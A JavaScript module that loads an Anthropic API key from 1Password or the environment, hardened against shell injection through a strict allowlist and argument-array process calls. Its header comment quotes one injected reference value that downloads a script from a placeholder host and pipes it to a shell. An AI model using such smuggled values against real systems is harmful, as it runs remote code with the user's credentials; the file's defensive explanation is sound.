/**
 * load-api-key.mjs — resolve the Anthropic API key, from 1Password or the env.
 *
 * Two rules shape this file, and both exist because the reference
 * implementation this was ported from broke them:
 *
 * 1. **Never interpolate the 1Password reference into a shell string.**
 *    The original ran `execSync(`op read "${opRef}"`)`. `OP_ANTHROPIC_REF`
 *    comes from `.env` / the environment — the same place a compromised or
 *    merely careless value comes from — and a reference containing `"` closes
 *    the quote, so `op://x" ; curl evil.sh | sh ; "` executes as a shell
 *    pipeline with the user's credentials. This module never builds a command
 *    string: it validates the reference against a strict allowlist AND passes
 *    it through `execFileSync`'s argument array, so there is no shell to
 *    escape from even if the allowlist is one day widened.
 *
 * 2. **Library code throws; only a CLI exits.** The original called
 *    `process.exit(1)` from inside the resolver, which means a caller that
 *    wanted to fall back to another provider, or a test that wanted to assert
 *    the failure, could do neither — the process was already gone. Every
 *    failure here is a thrown `Error` with an actionable message; the two
 *    batch-API CLIs catch it, print it, and exit themselves.
 *
 * Secret hygiene: an API key that reaches a log is burned. `redactSecret()`
 * is the same `.split(key).join('[REDACTED]')` shape `gemini-eval.mjs:405`
 * uses, exported here so every caller redacts identically instead of
 * reinventing it (and forgetting on one path).
 */

import { execFileSync, spawnSync } from 'child_process';

/**
 * A 1Password secret reference, conservatively.
 *
 * `op://<vault>/<item>/[section/]<field>` — 2 to 4 path segments after the
 * scheme. Segments allow letters, digits, space, and `._-` only: enough for
 * real vault and item names ("Private", "Anthropic API Key"), and short of
 * every shell metacharacter, quote, backslash, newline, and `$`.
 *
 * Deliberately strict rather than "escape what we find": an allowlist fails
 * closed on a value nobody anticipated, and the cost of a false rejection is
 * a clear error message the user can act on.
 */
const OP_REF_RE =
  /^op:\/\/[A-Za-z0-9 ._-]{1,100}(?:\/[A-Za-z0-9 ._-]{1,100}){1,3}$/;

/** Shortest plausible `sk-ant-…` key. Catches an empty or truncated value. */
const MIN_KEY_LENGTH = 20;

/**
 * Replace every occurrence of a secret with `[REDACTED]`.
 *
 * Used on error messages before they are printed: `op` and the Anthropic SDK
 * both echo request detail on failure, and a key that lands in a terminal
 * scrollback or a CI log has to be rotated.
 *
 * @param {unknown} message - Text that may embed the secret.
 * @param {string|null|undefined} secret - The secret to scrub, if known.
 * @returns {string} The message with the secret removed.
 */
export function redactSecret(message, secret) {
  const text = String(message ?? '');
  if (!secret || secret.length < 8) return text;
  return text.split(secret).join('[REDACTED]');
}

/**
 * Whether the 1Password CLI is on PATH.
 *
 * The programmatic equivalent of `command -v op`, and it has to be checked
 * BEFORE the read: without it, a machine with no `op` installed reports the
 * raw spawn failure ("spawnSync op ENOENT"), which reads like a bug in
 * career-ops rather than a missing dependency. `spawnSync` is used instead of
 * a shelled-out `command -v` so no shell is involved on this path either, and
 * so the check works the same on Windows, where `command` does not exist.
 *
 * @returns {boolean} True when `op --version` can be executed.
 */
export function isOnePasswordCliAvailable() {
  const probe = spawnSync('op', ['--version'], {
    encoding: 'utf-8',
    timeout: 10_000,
  });
  return !probe.error && probe.status === 0;
}

/**
 * Resolve the Anthropic API key.
 *
 * Resolution order, 1Password first: a shell plugin or a stale `.env` can
 * leave a long-expired `ANTHROPIC_API_KEY` in the environment, and silently
 * preferring it over an explicitly configured vault reference produces a 401
 * the user cannot explain. An explicit `OP_ANTHROPIC_REF` is an explicit
 * instruction.
 *
 *   1. `OP_ANTHROPIC_REF` → `op read <ref>` (1Password CLI; may prompt / Touch ID)
 *   2. `ANTHROPIC_API_KEY`
 *
 * @param {{env?: Record<string, string|undefined>}} [options]
 * @returns {{key: string, source: '1password'|'env'}} The key and where it came from.
 * @throws {Error} When no key can be resolved. The message never contains a key.
 */
export function loadAnthropicApiKey({ env = process.env } = {}) {
  const opRef = env.OP_ANTHROPIC_REF?.trim();

  if (opRef) {
    if (!OP_REF_RE.test(opRef)) {
      throw new Error(
        'OP_ANTHROPIC_REF is not a valid 1Password secret reference. ' +
          'Expected op://<vault>/<item>[/<section>]/<field> using letters, digits, spaces, dots, dashes or underscores. ' +
          'The value is refused rather than passed to the shell.',
      );
    }
    if (!isOnePasswordCliAvailable()) {
      throw new Error(
        'OP_ANTHROPIC_REF is set but the 1Password CLI (`op`) is not available on PATH. ' +
          'Install it (https://developer.1password.com/docs/cli/) and run `op signin`, ' +
          'or unset OP_ANTHROPIC_REF and set ANTHROPIC_API_KEY instead.',
      );
    }

    let key;
    try {
      // Argument array, never a command string — see the header. No `shell: true`.
      key = execFileSync('op', ['read', opRef], {
        encoding: 'utf-8',
        timeout: 120_000,
      }).trim();
    } catch (err) {
      // `op` can echo the reference back; the reference is not secret, but the
      // error may also carry the retrieved value on some failure paths.
      throw new Error(
        `Failed to read the API key from 1Password (${opRef}): ${redactSecret(err?.message, env.ANTHROPIC_API_KEY)}. ` +
          'Check that you are signed in (`op signin`) and that the reference points at the key field.',
      );
    }

    if (key.length < MIN_KEY_LENGTH) {
      throw new Error(
        `1Password returned a value too short to be an API key (${key.length} chars) for ${opRef}. ` +
          'The reference probably points at the wrong field.',
      );
    }
    return { key, source: '1password' };
  }

  const envKey = env.ANTHROPIC_API_KEY?.trim();
  if (envKey && envKey.length >= MIN_KEY_LENGTH) {
    return { key: envKey, source: 'env' };
  }

  throw new Error(
    'No Anthropic API key found. Set ANTHROPIC_API_KEY in your environment or .env, ' +
      'or set OP_ANTHROPIC_REF to a 1Password secret reference (op://<vault>/<item>/<field>).',
  );
}
